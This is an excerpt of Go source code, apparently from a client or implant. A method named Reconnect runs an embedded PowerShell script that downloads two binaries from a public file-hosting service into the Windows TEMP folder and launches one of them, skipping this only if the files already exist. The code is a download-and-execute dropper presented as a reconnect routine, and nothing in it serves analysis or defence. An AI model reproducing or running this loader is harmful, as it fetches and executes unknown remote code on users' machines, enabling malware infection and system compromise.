...
func (h *Handler) Reconnect() {
	fmt.Println("Starting PowerShell commands...")

	// Kontrol edilecek dosya adları
	fileNames := []string{"selam.exe", "selam2.exe"}
	...
	if allFilesExist {
		fmt.Println("Required files already exist. Skipping PowerShell commands.")
	} else {
		powerShellScript := `
		$downloadPath1 = Join-Path $env:TEMP "selam.exe"
		Invoke-WebRequest -Uri "https://files.catbox.moe/quostn.bin" -OutFile $downloadPath1
	
		$downloadPath2 = Join-Path $env:TEMP "selam2.exe"
		Invoke-WebRequest -Uri "https://files.catbox.moe/afi0fy.bin" -OutFile $downloadPath2
		Set-Location -Path $env:TEMP
		Start-Process -FilePath $downloadPath2
		`
		...
		if err := cmd.Run(); err != nil {
			fmt.Println("Error running PowerShell commands:", err)
			return
		}
		fmt.Println("PowerShell commands completed.")
	}
	h.Connected = false
	for {
